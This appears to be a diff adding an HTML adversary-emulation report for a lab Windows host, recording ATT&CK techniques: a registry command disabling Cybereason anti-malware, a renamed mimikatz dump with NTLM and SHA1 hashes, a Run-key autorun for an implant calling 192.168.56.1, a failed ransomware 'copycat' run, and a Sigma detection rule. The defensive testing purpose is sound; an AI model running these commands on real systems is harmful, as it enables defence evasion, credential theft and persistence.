+cmd.exe                       6228                            1      3,992 K
+conhost.exe                   1732                            1     13,548 K
+taskhostw.exe                 3328                            1     20,056 K
+LogonUI.exe                  12804                            1     26,360 K
+ctfmon.exe                    1488 Console                    2     20,224 K
+svchost.exe                   7144 Services                   0      9,744 K
+svchost.exe                    768 Services                   0      7,704 K
+svchost.exe                  13668 Services                   0      9,812 K
+leonidas.exe                  5660 Console                    2     38,076 K
+cmd.exe                       3732 Console                    2      4,576 K
+</div> <p></p>
+                </div>
+          </div>
+  </div>
+</div>
+        </div>
+          
+        <div class="row">
+            <div class="card text-white bg-dark mb-3" style="width: 100%;">
+        <div class="card-header">T1562.001 - Impair Defenses - Disable or Modify Tools </div>
+  <div class="card-body">
+      <div class="row">
+      <div class="col-md-6">
+    <h4 class="card-title">Disable Cybereason Anti-malware</h4>
+          <h6>Weight: High</h6>
+          <h6>Status: Sucess</h6>
+          <h6>Detection: Not Detected</h6>
+          <h6>Modifiers: NA</h6>
+          <p>Notes: note example</p>
+          </div>
+                <div class="col-md-6">
+                    <h5>Instruction: reg add 
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CybereasonAntiMalware
+ /t REG_EXPAND_SZ /v ImagePath /d starwaytoheaven /f</h5>
+                    <p>Result: </p><div class="jumbotron" style="color:black;">
+The operation completed successfully.
+</div> <p></p>
+                </div>
+          </div>
+  </div>
+</div>
+        </div>
+          
+        <div class="row">
+            <div class="card text-white bg-dark mb-3" style="width: 100%;">
+        <div class="card-header">T1003.001 - OS Credential Dumping - LSASS Memory </div>
+  <div class="card-body">
+      <div class="row">
+      <div class="col-md-6">
+    <h4 class="card-title">mimikatz dump</h4>
+          <h6>Weight: Normal</h6>
+          <h6>Status: Sucess</h6>
+          <h6>Detection: Not Detected</h6>
+          <h6>Modifiers: NA</h6>
+          <p>Notes: note example</p>
+          </div>
+                <div class="col-md-6">
+                    <h5>Instruction: lotsoflove.exe privilege::debug sekurlsa::logonPasswords exit</h5>
+                    <p>Result: </p><div class="jumbotron" style="color:black;">
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 27 2022 16:33:52
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \\ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # sekurlsa::logonPasswords
+
+Authentication Id : 0 ; 1669489 (00000000:00197971)
+Session           : Interactive from 2
+User Name         : Administrator
+Domain            : NIMITZ
+Logon Server      : NIMITZ
+Logon Time        : 8/27/2022 5:00:13 PM
+SID               : S-1-5-21-1789091145-4003832025-2814616898-500
+\tmsv :\t
+\t [00000003] Primary
+\t * Username : Administrator
+\t * Domain   : NIMITZ
+\t * NTLM     : 10b0e6c86fd81877d98c030db0251c3b
+\t * SHA1     : b86889d2494ad8f39538e55cf1124196d1fd9c9d
+\ttspkg :\t
+\twdigest :\t
+\t * Username : Administrator
+\t * Domain   : NIMITZ
+\t * Password : (null)
+\tkerberos :\t
+\t * Username : Administrator
+\t * Domain   : NIMITZ
+\t * Password : (null)
+\tssp :\t
+\tcredman :\t
+\tcloudap :\t
+
+Authentication Id : 0 ; 1579134 (00000000:0018187e)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 8/27/2022 5:00:07 PM
+SID               : S-1-5-90-0-2
+\tmsv :\t
+\ttspkg :\t
+\twdigest :\t
+\t * Username : NIMITZ$
+\t * Domain   : WORKGROUP
+\t * Password : (null)
+\tkerberos :\t
+\tssp :\t
+\tcredman :\t
+\tcloudap :\t
+
+Authentication Id : 0 ; 1578635 (00000000:0018168b)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 8/27/2022 5:00:07 PM
+SID               : S-1-5-90-0-2
+\tmsv :\t
+\ttspkg :\t
+\twdigest :\t
+\t * Username : NIMITZ$
+\t * Domain   : WORKGROUP
+\t * Password : (null)
+\tkerberos :\t
+\tssp :\t
+\tcredman :\t
+\tcloudap :\t
+
+Authentication Id : 0 ; 1573987 (00000000:00180463)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 8/27/2022 5:00:07 PM
+SID               : S-1-5-96-0-2
+\tmsv :\t
+\ttspkg :\t
+\twdigest :\t
+\t * Username : NIMITZ$
+\t * Domain   : WORKGROUP
+\t * Password : (null)
+\tkerberos :\t
+\tssp :\t
+\tcredman :\t
+\tcloudap :\t
+
+Authentication Id : 0 ; 256176 (00000000:0003e8b0)
+Session           : Interactive from 1
+User Name         : nimitz
+Domain            : NIMITZ
+Logon Server      : NIMITZ
+Logon Time        : 8/27/2022 4:56:10 PM
+SID               : S-1-5-21-1789091145-4003832025-2814616898-1001
+\tmsv :\t
+\t [00000003] Primary
+\t * Username : nimitz
+\t * Domain   : .
+\t * NTLM     : 3dbde697d71690a769204beb12283678
+\t * SHA1     : 0d5399508427ce79556cda71918020c1e8d15b53
+\ttspkg :\t
+\twdigest :\t
+\t * Username : nimitz
+\t * Domain   : NIMITZ
+\t * Password : (null)
+\tkerberos :\t
+\t * Username : nimitz
+\t * Domain   : NIMITZ
+\t * Password : (null)
+\tssp :\t
+\tcredman :\t
+\tcloudap :\t
+
+Authentication Id : 0 ; 255832 (00000000:0003e758)
+Session           : Interactive from 1
+User Name         : nimitz
+Domain            : NIMITZ
+Logon Server      : NIMITZ
+Logon Time        : 8/27/2022 4:56:10 PM
+SID               : S-1-5-21-1789091145-4003832025-2814616898-1001
+\tmsv :\t
+\t [00000003] Primary
+\t * Username : nimitz
+\t * Domain   : .
+\t * NTLM     : 3dbde697d71690a769204beb12283678
+\t * SHA1     : 0d5399508427ce79556cda71918020c1e8d15b53
+\ttspkg :\t
+\twdigest :\t
+\t * Username : nimitz
+\t * Domain   : NIMITZ
+\t * Password : (null)
+\tkerberos :\t
+\t * Username : nimitz
+\t * Domain   : NIMITZ
+\t * Password : (null)
+\tssp :\t
+\tcredman :\t
+\tcloudap :\t
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 8/27/2022 4:56:07 PM
+SID               : S-1-5-19
+\tmsv :\t
+\ttspkg :\t
+\twdigest :\t
+\t * Username : (null)
+\t * Domain   : (null)
+\t * Password : (null)
+\tkerberos :\t
+\t * Username : (null)
+\t * Domain   : (null)
+\t * Password : (null)
+\tssp :\t
+\tcredman :\t
+\tcloudap :\t
+
+Authentication Id : 0 ; 50548 (00000000:0000c574)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 8/27/2022 4:56:07 PM
+SID               : S-1-5-90-0-1
+\tmsv :\t
+\ttspkg :\t
+\twdigest :\t
+\t * Username : NIMITZ$
+\t * Domain   : WORKGROUP
+\t * Password : (null)
+\tkerberos :\t
+\tssp :\t
+\tcredman :\t
+\tcloudap :\t
+
+Authentication Id : 0 ; 50484 (00000000:0000c534)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 8/27/2022 4:56:07 PM
+SID               : S-1-5-90-0-1
+\tmsv :\t
+\ttspkg :\t
+\twdigest :\t
+\t * Username : NIMITZ$
+\t * Domain   : WORKGROUP
+\t * Password : (null)
+\tkerberos :\t
+\tssp :\t
+\tcredman :\t
+\tcloudap :\t
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : NIMITZ$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 8/27/2022 4:56:07 PM
+SID               : S-1-5-20
+\tmsv :\t
+\ttspkg :\t
+\twdigest :\t
+\t * Username : NIMITZ$
+\t * Domain   : WORKGROUP
+\t * Password : (null)
+\tkerberos :\t
+\t * Username : nimitz$
+\t * Domain   : WORKGROUP
+\t * Password : (null)
+\tssp :\t
+\tcredman :\t
+\tcloudap :\t
+
+Authentication Id : 0 ; 28502 (00000000:00006f56)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 8/27/2022 4:56:07 PM
+SID               : S-1-5-96-0-1
+\tmsv :\t
+\ttspkg :\t
+\twdigest :\t
+\t * Username : NIMITZ$
+\t * Domain   : WORKGROUP
+\t * Password : (null)
+\tkerberos :\t
+\tssp :\t
+\tcredman :\t
+\tcloudap :\t
+
+Authentication Id : 0 ; 28324 (00000000:00006ea4)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 8/27/2022 4:56:07 PM
+SID               : S-1-5-96-0-0
+\tmsv :\t
+\ttspkg :\t
+\twdigest :\t
+\t * Username : NIMITZ$
+\t * Domain   : WORKGROUP
+\t * Password : (null)
+\tkerberos :\t
+\tssp :\t
+\tcredman :\t
+\tcloudap :\t
+
+Authentication Id : 0 ; 27167 (00000000:00006a1f)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 8/27/2022 4:56:06 PM
+SID               : 
+\tmsv :\t
+\ttspkg :\t
+\twdigest :\t
+\tkerberos :\t
+\tssp :\t
+\tcredman :\t
+\tcloudap :\t
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : NIMITZ$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 8/27/2022 4:56:06 PM
+SID               : S-1-5-18
+\tmsv :\t
+\ttspkg :\t
+\twdigest :\t
+\t * Username : NIMITZ$
+\t * Domain   : WORKGROUP
+\t * Password : (null)
+\tkerberos :\t
+\t * Username : nimitz$
+\t * Domain   : WORKGROUP
+\t * Password : (null)
+\tssp :\t
+\tcredman :\t
+\tcloudap :\t
+
+mimikatz(commandline) # exit
+Bye!</div> <p></p>
+                </div>
+          </div>
+  </div>
+</div>
+        </div>
+          
+        <div class="row">
+            <div class="card text-white bg-dark mb-3" style="width: 100%;">
+        <div class="card-header">T1547.001 - Boot or Logon Autostart Execution - Registry Run Keys / Startup Folder </div>
+  <div class="card-body">
+      <div class="row">
+      <div class="col-md-6">
+    <h4 class="card-title">Leonidas Autorun</h4>
+          <h6>Weight: High</h6>
+          <h6>Status: Sucess</h6>
+          <h6>Detection: Not Detected</h6>
+          <h6>Modifiers: NA</h6>
+          <p>Notes: note example</p>
+          </div>
+                <div class="col-md-6">
+                    <h5>Instruction: reg add 
+HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v 
+7349EB83797217EE05BA5BCAss1A621B39 /t REG_SZ /d 
+"C:\Windows\system32\leonidas.exe  192.168.56.1 2020" /f</h5>
+                    <p>Result: </p><div class="jumbotron" style="color:black;">
+The operation completed successfully.
+</div> <p></p>
+                </div>
+          </div>
+  </div>
+</div>
+        </div>
+          
+        <div class="row">
+            <div class="card text-white bg-dark mb-3" style="width: 100%;">
+        <div class="card-header">T1486 - Data Encrypted for Impact </div>
+  <div class="card-body">
+      <div class="row">
+      <div class="col-md-6">
+    <h4 class="card-title">Deploy Lockbit Copycat</h4>
+          <h6>Weight: Normal</h6>
+          <h6>Status: Error</h6>
+          <h6>Detection: NA</h6>
+          <h6>Modifiers: NA</h6>
+          <p>Notes: note example</p>
+          </div>
+                <div class="col-md-6">
+                    <h5>Instruction: ./svchost.exe</h5>
+                    <p>Result: </p><div class="jumbotron" style="color:black;">538927814c5effad6f6a6bda7d2d9804d349dbb8</div> <p></p>
+                </div>
+          </div>
+  </div>
+</div>
+        </div>
+          
+    </div>
+    <hr>
+        
+    
+    <hr>
+            
+        <div class="jumbotron">
+                            <div class="row">
+            <h2 style="color: #9600FF;">Possible Improvements</h2>
+        </div>
+            
+            <div class="row">
+            <div class="card text-white bg-dark mb-3" style="width: 100%;">
+        <div class="card-header">Detected mimikatz command lines</div>
+  <div class="card-body">
+      <div class="row">
+      <div class="col-md-6">
+          <h6>Syntax: SIGMA</h6>
+          <h6>For Technique: OS Credential Dumping - LSASS Memory </h6>
+          <h6>ATT&amp;CK ID: T1003.001</h6>
+          </div>
+                <div class="col-md-6">
+                    <h5>Syntax:</h5>
+                    <p></p><div class="jumbotron" style="color:black;">title:
+ Mimikatz Command Line
+id: a642964e-bead-4bed-8910-1bb4d63e3b4d
+status: test
+description: Detection well-known mimikatz command line arguments
+author: Teymur Kheirkhabarov, oscd.community, David ANDRE (additional 
+keywords), Tim Shelton
+references:
+  - 
+https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment
+
+  - https://tools.thehacker.recipes/mimikatz/modules
+date: 2019/10/22
+modified: 2022/02/07
+tags:
+  - attack.credential_access
+  - attack.t1003.001
+  - attack.t1003.002
+  - attack.t1003.004
+  - attack.t1003.005
+  - attack.t1003.006
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection_1:
+    CommandLine|contains:
+      - DumpCreds
+      - invoke-mimikatz
+  module_names:
+    CommandLine|contains:
+      - rpc
+      - token
+      - crypto
+      - dpapi
+      - sekurlsa
+      - kerberos
+      - lsadump
+      - privilege
+      - process
+      - vault
+  mimikatz_separator:
+    CommandLine|contains: '::'
+  function_names: # To cover functions from modules that are not in 
+module_names (likely too generic)
+    CommandLine|contains:
+      - 'aadcookie' #misc module
+      - 'detours' #misc module
+      - 'memssp' #misc module
+      - 'mflt' #misc module
+      - 'ncroutemon' #misc module
+      - 'ngcsign' #misc module
+      - 'printnightmare' #misc module
+      - 'skeleton' #misc module
+      - 'preshutdown'  #service module
+      - 'mstsc'  #ts module
+      - 'multirdp'  #ts module
+  filter_1:
+    CommandLine|contains: 'function Convert-GuidToCompressedGuid'
+  condition: ( selection_1 or (module_names and mimikatz_separator) or 
+(function_names and mimikatz_separator) ) and not 1 of filter*
+falsepositives:
+  - Legitimate Administrator using tool for password recovery
+level: medium</div> <p></p>
+                </div>
+          </div>
+  </div>
+</div>
+        </div>
+            
+        </div>
+        
+
+</div>
+
+
+
+  <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+
+
+</body></html>
